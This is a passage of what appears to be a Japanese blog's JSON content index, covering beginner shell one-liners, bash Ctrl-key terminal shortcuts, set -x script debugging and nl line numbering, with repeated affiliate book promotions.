$(ls); do echo file: $i;done もしくは、\nfor i in *; do echo file: $i; done myfile内に記載された名前を使ってディレクトリを作成 for dir in $(\u0026lt;myfile); do mkdir $dir; done openssl 16 進数の MD5 チェックサム値を base64 エンコード形式に変換します。 openssl md5 -binary /path/to/file| base64 # NWbeOpeQbtuY0ATWuUeumw== 言語属性 アプリケーションが出力にデフォルト言語を使用することを強制します export LC_ALL=C # to revert: unset LC_ALL 文字列を Base64 文字列としてエンコードする echo test|base64 #dGVzdAo= バッググラウンド処理 バックグラウンドで複数のコマンドを実行する (sleep 2; sleep 3) \u0026amp; # run parallelly sleep 2 \u0026amp; sleep 3 \u0026amp; CSV系 .xls を csv に変換 xls2csv filename ステータス処理 別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します (よくできました) cd tmp/ \u0026amp;\u0026amp; tar xvf ~/a.tar 別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する (終了していない) cd tmp/a/b/c ||mkdir -p tmp/a/b/c read ユーザー入力の読み取り read input echo $input 配列 配列の宣言 declare -a array=() または\ndeclare array=() または\ndeclare -A array=() 圧縮・解凍 tar.bz2 ファイルを解凍します (例: file.tar.bz2)。 tar xvfj file.tar.bz2 tar.xz ファイルを解凍します (例: file.tar.xz)。 unxz file.tar.xz tar xopf file.tar pdftotext PDFをtxtに変換 sudo apt-get install poppler-utils pdftotext example.pdf example.txt 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-30T11:23:02+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/","title":"【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】"},{"content":"ターミナルトリック ターミナル（コンソール）で、「知っているとちょっとだけ便利なコマンド」を紹介します。\nこのコマンドはCtrlキーを押しながら（組み合わせて）使います。\n例えば、Ctrl n は、Ctrlを押しながら n を押します。\nWindowsの貼り付けコマンド Ctrl + v の感じです。\nコマンドを覚えるコツは、ゆっくりやることです。\nなんどもゆっくりやることで直感的に使いこなすことができます。\n便利なショートカットコマンドは、使わずに素早くやることに意味はありません。\nゆっくりとでもショートカットコマンドを活用していくことで、素早く考えることなく、直感的に活用することができるようになります。\nCtrl f カーソル位置を後方に１文字ずつ移動 Ctrl fは、カーソル位置を後方に１文字ずつ移動します。\nCtrl f : カーソル位置を後方に１文字ずつ移動します。 Ctrl b カーソル位置を前方に１文字ずつ移動 Ctrl bは、カーソル位置を前方に１文字ずつ移動します。\nCtrl b : カーソル位置を前方に１文字ずつ移動します。 Ctrl l 画面をクリアする Ctrl lは、画面がコマンドで一杯になった、ログを出力して画面が埋まってしまう、等の場合、Ctrl lコマンドで画面をクリアすることができます。\n日常的に非常によく使うコマンドです。\nCtrl l : クリアと同等。 Ctrl m Enterキーを使わない Ctrl mは、キーボードのEnterキーと同じ挙動です。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl m : Enterと同じ Ctrl n 下矢印キーを使わない Ctrl nは、キーボードの下矢印キーと同様の振る舞いをします。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl n : 下矢印と同じ。 Ctrl p 上矢印キーを使わない Ctrl pは、キーボードの上矢印キーと同様の振る舞いをします。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl p : 上矢印と同じ。 Ctrl r 同じコマンドを再入力しない Ctrl rは、コマンド履歴の後方検索を開始します (後方に移動するには Ctrl r を押し続けます)\nCtrl pやCtrl nで過去のコマンド履歴を順にたどっていってもよいのですが、過去のコマンド履歴を簡単に検索して実行することができます。\nCtrl rを押して、冒頭行から数文字を入力することでマッチする過去のコマンドが表示されます。\nCtrl r : コマンド履歴の後方検索 Ctrl h カーソル位置の手前の文字を削除（BackSpaceキーを使わない） Ctrl hは、キーボードのBackSpace、Macではdeleteキーと同じ挙動です。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl h : BackSpaceと同じ。カーソル位置の手前の文字を削除します。 Ctrl d カーソル位置の文字を削除（BackSpce/deleteとは異なります） Ctrl dは、カーソルの下の文字を削除します。\nBackSpce/deleteは、カーソル手前の一文字を削除しますが、このコマンドはカーソル位置の文字を削除します。\nCtrl d : カーソル下の文字を削除します。 Ctrl u カーソル位置の手前から行頭までのすべてのテキストを削除 Ctrl uは、行頭まで削除します。\nカーソルの１文字手前から行頭までを削除します。\nCtrl u : カーソル位置の手前から行頭までのすべてのテキストを削除します。 Ctrl k カーソル位置から行末までのすべてのテキストを削除 Ctrl kは、カーソルから行末までのすべてのテキストを削除します。\nvimの Shift dコマンドと同じです。\nCtrl k : カーソルから行末までのすべてのテキストを削除します。 Ctrl x BackSpace カーソル位置から行頭までのすべてのテキストを削除します。 Ctrl x BackSpaceは、行頭からカーソルまでのすべてのテキストを削除します。\nBackSpaceを使わずにCtrl hを使う。とか言っておきながらなんなのですが、便利なので覚えてください。\nCtrl xに続いてBackSpceを押します。\nCtrl x backspace : 行頭からカーソルまでのすべてのテキストを削除します。 Ctrl a コマンド行先頭へジャンプ Ctrl aは、コマンドの行頭に移動します。\n頻繁に利用される必須のコマンドの1つです。\nCtrl a : 行頭に移動します。 Ctrl e コマンド行末へジャンプ Ctrl e コマンドの行末に移動します。\n頻繁に利用される必須のコマンドの1つです。\nCtrl e : 行末に移動します。 Ctrl t 前後の文字を入れ替え Ctrl t は、カーソルの前の文字をカーソルの下の文字と入れ替えます。\n例えば Windows というコマンドを入力したいとします。\nキーボードの入力で Windwos となってしまった場合、wとoを入れ替えたいと考えます。\nこの場合、windwosの o にカーソルを移動して Ctrl t を実行します。\nCtrl t : カーソルの前の文字をカーソルの下の文字と入れ替えます。Esc t を押すと、カーソルの前の 2 つの単語が入れ替えられます。 Ctrl w カーソル位置の手前の単語を切り取り貼り付ける Ctrl wは、カーソルの前の単語を切り取ります。\n切り取った単語はクリップボードの保存されるので、Ctrl y で貼り付ける事ができます。\nCtrl w : カーソルの前の単語を切り取ります。Ctrl y 貼り付けます Ctrl u カーソル位置の手前から行頭を切り取り貼り付けます。 Ctrl uは、カーソル位置の手前から行頭にかけてすべての文字列を切り取ります。\nCtrl yで貼り付ける事ができます。\nCtrl u : カーソルの前の行を切り取ります。次に Ctrl y で貼り付けます ヒント とにかく、ゆっくりとコマンドを入力することです。\n何度も繰り返しゆっくりと実行することで、いずれ素早く実行できるようになります。\n焦ってはいけません。 【超裏技】 Esc #(Shift 3) コマンドライン行をコメントアウトして改行 このTIPSはものすごく便利です。\n必ず覚えておくと良いことがあります。\nまず、ある程度長いコマンドを入力し終わってEnterキーを押して実行しようとしているとします。\n「あ・・」と、気がついて「ディレクトリに入るのを忘れてた」と思い出します。\ncd hoge など、ディレクトリ移動をして、先程の長いコマンドを再入力する。\nこんな面倒なことってよくありますよね。\n一般的な方法 Ctrl a ＋ #(Shift 3) $ ./configure sutasuta hoihoi option=hoge と、入力して、このコマンドラインのカーソル行をCtrl aで先頭に移動して、#(Shift 3)を入力してEnterキーを押す。\nそうすると、コマンドラインは以下のようになります。\n$ #./configure sutasuta hoihoi option=hoge ここで改めて\n$ cd hoge で、ディレクトリに入ってから、Ctrl pで１つ前のコマンドを呼び出して、行頭の#をCtrl dで消します。\n$ #./configure sutasuta hoihoi option=hoge \u0026lt;Ctrl d で行頭の # を消す\u0026gt; $ ./configure sutasuta hoihoi option=hoge \u0026lt;Enterキーで実行\u0026gt; 超裏技 Esc ＋ #（Shift 3） もう少し楽にできるショートカットが用意されています。\nEsc を押し離してから#（Shift+3）を押します。\nすると一瞬でコマンドラインの行頭に # が付与されて改行されます。\nまず、先走ってコマンドラインを入力したとします。\n$ ./configure sutasuta hoihoi option=hoge Esc # でコマンドラインをコメントアウトします。\n$ #./configure sutasuta hoihoi option=hoge その後、あらためてcd hogeでディレクトリ移動\n$ cd hoge Ctrl pで１つ前のコマンドを呼び出して、Ctrl dで行頭の#を消す\n\u0026lt;Ctrl p\u0026gt;で１つ前のコマンドを呼び出す $ #./configure sutasuta hoihoi option=hoge \u0026lt;Ctrl d で行頭の # を消す\u0026gt; $ ./configure sutasuta hoihoi option=hoge \u0026lt;Enterキーで実行\u0026gt; まとめると、\nEsc #でコマンドラインをコメントアウト 何らかの別コマンドを入力 Ctrl pで先程のコマンドラインを呼び出す Ctrl dで行頭の#を削除してEnter ヒント Esc # はコマンドライン全体をコメントアウトして改行するコマンドです。\n一度入力したコマンドを再入力する手間が省けます。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-28T11:49:20+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/linux_hueec1b1e756b5511ebd26a37adc2ae307_89902_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-28-01-terminaltips-suzuki/","title":"【ターミナルTIPS】ターミナルで知っておくとちょっとだけ便利なコマンド"},{"content":"スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-11-10T10:28:21+09:00","image":"https://suzukiiichiro.github.io/posts/2022-11-10-01-set-x-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-11-10-01-set-x-suzuki/","title":"【set -x】bash/シェルスクリプトマニアックコマンドあれこれ１２"},{"content":"nlコマンド nl コマンドは、テキストファイルを行番号付きで出力するコマンドです。\ncat -n コマンドでも行番号を付けることができますが、nl コマンドでは、正規表現など、より細かい設定が可能です。\n行番号をつける ファイルに行番号を追加するには、ファイルの名前をnl コマンドに渡すだけです。\nデフォルトでは、ファイルのすべての行に行番号が追加されます。例として、以下の出力を参照してください。\nbash-5.1$ nl distros.txt 1\tAlmaLinux 2\tArch Linux 3\tCentOS 4\tDebian 5\tFedora 6\tGentoo 7\tManjaro 8\topenSUSE 9\tRed Hat 10\tUbuntu bash-5.1$ これはこれで非常に便利なのですが、デフォルトでは、出力にタブ文字、行番号、がテキストの前に追加されました。\nこれは、特定のデータ文字列がどの行に表示されるかをすばやく確認するための優れた方法です。\nしかし、他の状況ではあまり役に立たないかもしれません。\nこの出力のフォーマットを変更する方法を以下に示します。\n行番号の書式を変更する 書式を少し変更してみます。\n行番号をフォーマットする一般的な方法の １つは、番号の後にピリオドを置くことです。\nnl -s のように-sオプションを使用します。\nbash-5.1$ nl -s \u0026#34;. \u0026#34; distros.txt 1. AlmaLinux 2. Arch Linux 3. CentOS 4. Debian 5. Fedora 6. Gentoo 7. Manjaro 8. openSUSE 9. Red Hat 10. Ubuntu bash-5.1$ 行番号の手前のスペースを調整 行番号前のスペースを調整したい場合、nl -w (width) オプションで調整することができます。\nスペースを完全に取り除くには、nl -w1 （幅１）を指定します。\n-sオプションを引き続き使用していることに注意してください。\nこれにより、両方の書式設定の変更が反映されます。\nbash-5.1$ nl -w3 -s \u0026#34;. \u0026#34; distros.txt 1. AlmaLinux 2. Arch Linux 3. CentOS 4. Debian 5. Fedora 6. Gentoo 7. Manjaro 8. openSUSE 9. Red Hat 10. Ubuntu bash-5.1$ 開始番号を指定する 1 以外の番号から番号付けを開始したい場合は、-vオプションをnlと共に使用して、別の番号を指定できます。\n例として、行番号を 100 から開始します。\nbash-5.1$ nl -v100 -w3 -s \u0026#34;. \u0026#34; distros.txt 100. AlmaLinux 101. Arch Linux 102. CentOS 103. Debian 104. Fedora 105. Gentoo 106. Manjaro 107. openSUSE 108. Red Hat 109. Ubuntu bash-5.1$ catコマンドで頑張ってみる もちろん、cat こまんどでもできますが、調整はパイプで繋いでsed を使うなどするしかありません。\nbash-5.1$ cat -n distros.txt 1\tAlmaLinux 2\tArch Linux 3\tCentOS 4\tDebian 5\tFedora 6\tGentoo 7\tManjaro 8\topenSUSE 9\tRed Hat 10\tUbuntu bash-5.1$ awkコマンドで頑張ってみる cat -n コマンドでの実現で、微調整にsedコマンドが必要なのであれば、最初からsedコマンドで行う方法もあります。\nbash-5.1$ awk \u0026#39;{print NR, $0}\u0026#39; distros.txt 1 AlmaLinux 2 Arch Linux 3 CentOS 4 Debian 5 Fedora 6 Gentoo 7 Manjaro 8 openSUSE 9 Red Hat 10 Ubuntu bash-5.1$ ヒント やり方は無限にあります。 解決方法は１つではありませんので、色々考えて見てください。 書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 